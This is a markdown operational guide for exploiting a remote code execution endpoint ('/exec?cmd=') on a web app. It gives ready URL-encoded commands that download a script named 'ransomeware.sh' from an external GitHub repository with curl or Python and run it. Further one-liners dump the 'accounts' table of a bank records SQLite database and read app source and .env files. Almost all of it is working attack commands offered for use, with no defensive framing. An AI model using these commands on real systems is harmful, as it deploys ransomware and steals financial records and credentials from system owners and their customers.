# RCE Payload Execution & Data Extraction Guide

This document provides a comprehensive operational guide for using the Remote Code Execution (RCE) endpoint (`/exec?cmd=`) to download payloads, configure environment variables, execute scripts, and inspect sensitive files or SQLite databases securely.

---

## 🛠️ Target Endpoint Overview
* **Target Endpoint:** `http://localhost:5000/exec?cmd=<COMMAND>`
* **Method:** HTTP GET (URL-encoded query parameter)

---

## Phase 1: Downloading & Executing the Payload Script

Because the target script (`ransomeware.sh`) utilizes the `set -u` nounset safety option, it will throw an `unbound variable` error if the `WORK` environment variable is not explicitly declared. The command below chains the download, permission assignment, environment export, and execution into a single line.

### Option A: Using `curl`
```text
http://localhost:5000/exec?cmd=curl%20-sL%20https%3A%2F%2Fraw.githubusercontent.com%2Fadrianwiraw%2Fyanrevenge%2Fmain%2Fdocker-container-rotkit%2Fransomeware.sh%20-o%20%2Ftmp%2Fransomeware.sh%20%26%26%20chmod%20%2Bx%20%2Ftmp%2Fransomeware.sh%20%26%26%20export%20WORK%3D%2Fapp%20%26%26%20bash%20%2Ftmp%2Fransomeware.sh
```

### Option B: Using Python (`urllib`) — Fallback if `curl` is missing
```text
http://localhost:5000/exec?cmd=python3%20-c%20%22import%20urllib.request;%20urllib.request.urlretrieve('https://raw.githubusercontent.com/adrianwiraw/yanrevenge/main/docker-container-rotkit/ransomeware.sh',%20'/tmp/ransomeware.sh')%22%20%26%26%20chmod%20%2Bx%20%2Ftmp%2Fransomeware.sh%20%26%26%20export%20WORK%3D%2Fapp%20%26%26%20bash%20%2Ftmp%2Fransomeware.sh
```

---

## Phase 2: Reading Files & Databases via Python

To avoid `utf-8` decoding errors when encountering binary files or databases like SQLite (`data/bank_records.db`), use safe Python one-liners passed directly through the `cmd` parameter.

### 1. Listing Tables in the SQLite Database (`data/bank_records.db`)
```text
http://localhost:5000/exec?cmd=python3%20-c%20%22import%20sqlite3;%20conn=sqlite3.connect('data/bank_records.db');%20cursor=conn.cursor();%20cursor.execute(\"SELECT name FROM sqlite_master WHERE type='table';\");%20print(cursor.fetchall());%20conn.close()
```

### 2. Dumping Table Contents (e.g., `accounts` or `users`)
```text
http://localhost:5000/exec?cmd=python3%20-c%20%22import%20sqlite3;%20conn=sqlite3.connect('data/bank_records.db');%20cursor=conn.cursor();%20cursor.execute('SELECT * FROM accounts');%20print('\n'.join([str(row) for row in cursor.fetchall()]));%20conn.close()
```

### 3. Safely Reading Plain Text Files (`.py`, `.txt`, `.env`)
```text
http://localhost:5000/exec?cmd=python3%20-c%20%22print(open('app.py',%20errors='ignore').read())%22
```

---

## 📌 Summary Workflow
1. **Deploy:** Trigger the download and execution of `ransomeware.sh` with `export WORK=/app`.
2. **Extract:** Query the SQLite database using Python handlers to retrieve records.
3. **Verify:** Check the HTTP response body for real-time command output.